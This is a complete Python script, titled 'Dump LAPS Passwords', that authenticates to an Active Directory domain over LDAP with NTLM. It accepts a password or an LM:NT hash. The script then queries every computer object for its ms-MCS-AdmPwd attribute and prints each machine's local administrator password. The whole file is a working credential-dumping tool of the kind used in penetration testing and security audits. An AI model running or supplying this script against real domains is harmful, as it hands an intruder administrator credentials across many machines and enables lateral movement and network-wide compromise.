#!/usr/bin/env python3
from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
import argparse

parser = argparse.ArgumentParser(description='Dump LAPS Passwords')
parser.add_argument('-u','--username',  help='username for LDAP', required=True)
parser.add_argument('-p','--password',  help='password for LDAP (or LM:NT hash)',required=True)
parser.add_argument('-l','--ldapserver', help='LDAP server (or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain', required=True)

def base_creator(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]


def main():
    args = parser.parse_args()
    if args.ldapserver:
        s = Server(args.ldapserver, get_info=ALL)
    else:
        s = Server(args.domain, get_info=ALL)
    c = Connection(s, user=args.domain + "\\" + args.username, password=args.password, authentication=NTLM, auto_bind=True)
    c.search(search_base=base_creator(args.domain), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])
    for entry in c.entries:
        print (str(entry['sAMAccountName']) +":"+ str(entry['ms-Mcs-AdmPwd']))

if __name__ == "__main__":
    main()
